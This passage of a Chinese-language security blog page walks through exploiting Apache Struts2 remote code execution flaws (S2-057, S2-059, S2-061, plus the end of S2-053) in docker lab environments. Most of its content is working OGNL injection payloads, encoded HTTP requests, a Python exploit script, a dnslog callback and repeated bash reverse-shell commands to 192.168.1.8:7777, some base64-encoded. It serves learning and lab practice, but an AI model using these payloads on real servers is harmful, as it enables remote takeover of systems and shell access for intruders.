class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="keyword">true</span>)).(#process=#p.start()).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(#process.getInputStream())</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820214026353.png" alt="image-20210820214026353"></p>
+<p>执行bash反弹命令，用nc监听端口即可得到反弹shell</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="keyword">true</span>)).(#process=#p.start()).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(#process.getInputStream())</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820214212397.png" alt="image-20210820214212397"></p>
+<h1 id="S2-057"><a href="#S2-057" class="headerlink" title="S2-057"></a>S2-057</h1><p>s2-057漏洞产生于网站配置XML时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，从而导致远程代码执行漏洞的发生。</p>
+<p>alwaysSelectFullNamespace被设置为true，此时namespace的值是从URL中获取的。URL是可控的，所以namespace也是可控的action元素没有名称空间属性集，或者使用通配符。该名称空间将由用户从URL传递并解析为OGNL表达式，最终导致远程代码执行的脆弱性。</p>
+<p>进入s2-057的docker环境</p>
+<p><img src="/images/struts2/image-20210820214415660.png" alt="image-20210820214415660"></p>
+<p>首先构造12+34回车</p>
+<p><img src="/images/struts2/image-20210820214546191.png" alt="image-20210820214546191"></p>
+<p>发现运算出了结果，说明存在漏洞</p>
+<p><img src="/images/struts2/image-20210820214553104.png" alt="image-20210820214553104"></p>
+<p>构造payload输出id</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123; (#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#ct=#request[<span class="string">&#x27;struts.valueStack&#x27;</span>].context).(#cr=#ct[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ou=#cr.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;id&#x27;</span>)).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(#a.getInputStream())</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>进行url编码</p>
+<p><img src="/images/struts2/image-20210820214806062.png" alt="image-20210820214806062"></p>
+<p>得到如下payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>%7B%<span class="number">20</span>(%23dm%<span class="number">3D</span>%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%<span class="number">3D</span>%23request%5B%27struts.valueStack%<span class="number">27</span>%<span class="number">5D</span>.context).(%23cr%<span class="number">3D</span>%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%<span class="number">27</span>%<span class="number">5D</span>).(%23ou%<span class="number">3D</span>%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%<span class="number">3D</span>%40java.lang.Runtime%40getRuntime().exec(%27id%<span class="number">27</span>)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%<span class="number">7D</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>bp抓包在GET处进行拼接得到id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /struts2-showcase/%24%7B%20(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820214934977.png" alt="image-20210820214934977"></p>
+<p>在exec处修改要执行得命令即可</p>
+<p><img src="/images/struts2/image-20210820215031642.png" alt="image-20210820215031642"></p>
+<h1 id="S2-059"><a href="#S2-059" class="headerlink" title="S2-059"></a>S2-059</h1><p>s2-059产生的原因为攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。</p>
+<p>进入s2-059的docker环境</p>
+<p><img src="/images/struts2/image-20210820215222307.png" alt="image-20210820215222307"></p>
+<p>访问8080看到有一个input:id</p>
+<p><img src="/images/struts2/image-20210820215326445.png" alt="image-20210820215326445"></p>
+<p>传参id=2进入发现出现在了input id:这个地方</p>
+<p><img src="/images/struts2/image-20210820215341184.png" alt="image-20210820215341184"></p>
+<p>这里构造<code>id=%25&#123;10*10&#125;</code>，发现自动进行了运算</p>
+<p><img src="/images/struts2/image-20210820215451870.png" alt="image-20210820215451870"></p>
+<p>使用bash反弹，先进行编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820215755513.png" alt="image-20210820215755513"></p>
+<p>编码后结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>生成一个test.py，将bash编码放入py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行即可得到反弹shell</p>
+<p><img src="/images/struts2/image-20210820220022589.png" alt="image-20210820220022589"></p>
+<h1 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h1><p>s2-061漏洞产生的原因是Struts2 会对某些标签属性(比如 <code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 <code>%&#123;x&#125;</code> 且 <code>x</code> 的值用户可控时，用户再传入一个 <code>%&#123;payload&#125;</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过</p>
+<p>进入s2-061的docker环境</p>
+<p><img src="/images/struts2/image-20210820220209093.png" alt="image-20210820220209093"></p>
+<p>还是构造一个<code>%25&#123;10*10&#125;</code>发现运算成功，证明漏洞存在</p>
+<p><img src="/images/struts2/image-20210820220504947.png" alt="image-20210820220504947"></p>
+<p>bp在<code>index.action</code>页面抓包</p>
+<p><img src="/images/struts2/image-20210820220806755.png" alt="image-20210820220806755"></p>
+<p>修改<code>Content-Type</code>如下并添加数据，这里如果直接使用GET方法是得不到回显的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820220945285.png" alt="image-20210820220945285"></p>
+<p>改为POST方法即可得到id</p>
+<p><img src="/images/struts2/image-20210820221000578.png" alt="image-20210820221000578"></p>
+<p>配合dnslog食用同理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ping 9vll55.dnslog.cn&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820221409313.png" alt="image-20210820221409313"></p>
+<p>bash反弹命令需要先进行编码，同之前操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820221450189.png" alt="image-20210820221450189"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
+
+
+
+<p>nc监听端口即可得到反弹shell</p>
+<p><img src="/images/struts2/image-20210820221616015.png" alt="image-20210820221616015"></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">Drunkmars</a>
+            <p>原文链接：<a href="http://example.com/2021/03/31/struts2/">http://example.com/2021/03/31/struts2/</a>
+            <p>发表日期：<a href="http://example.com/2021/03/31/struts2/">March 31st 2021, 12:00:00 am</a>
+            <p>更新日期：<a href="http://example.com/2021/03/31/struts2/">August 31st 2021, 9:13:41 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2021/04/01/tomcat/" title="tomcat漏洞大杂烩">
+                    <div class="nextTitle">tomcat漏洞大杂烩</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2021/03/30/IPC%E5%91%BD%E4%BB%A4&%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8A%E7%BA%BF/" title="IPC命令&计划任务上线">
+                    <div class="prevTitle">IPC命令&计划任务上线</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:drunkmars@vip.qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/Drunkmars" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://twitter.com/Drunkmars404" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-001"><span class="toc-number">2.</span> <span class="toc-text">S2-001</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-005"><span class="toc-number">3.</span> <span class="toc-text">S2-005</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-007"><span class="toc-number">4.</span> <span class="toc-text">S2-007</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-008"><span class="toc-number">5.</span> <span class="toc-text">S2-008</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-009"><span class="toc-number">6.</span> <span class="toc-text">S2-009</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-012"><span class="toc-number">7.</span> <span class="toc-text">S2-012</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-013"><span class="toc-number">8.</span> <span class="toc-text">S2-013</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-015"><span class="toc-number">9.</span> <span class="toc-text">S2-015</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-016"><span class="toc-number">10.</span> <span class="toc-text">S2-016</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-032"><span class="toc-number">11.</span> <span class="toc-text">S2-032</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-045"><span class="toc-number">12.</span> <span class="toc-text">S2-045</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-046"><span class="toc-number">13.</span> <span class="toc-text">S2-046</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-048"><span class="toc-number">14.</span> <span class="toc-text">S2-048</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-052"><span class="toc-number">15.</span> <span class="toc-text">S2-052</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-053"><span class="toc-number">16.</span> <span class="toc-text">S2-053</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-057"><span class="toc-number">17.</span> <span class="toc-text">S2-057</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-059"><span class="toc-number">18.</span> <span class="toc-text">S2-059</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-061"><span class="toc-number">19.</span> <span class="toc-text">S2-061</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
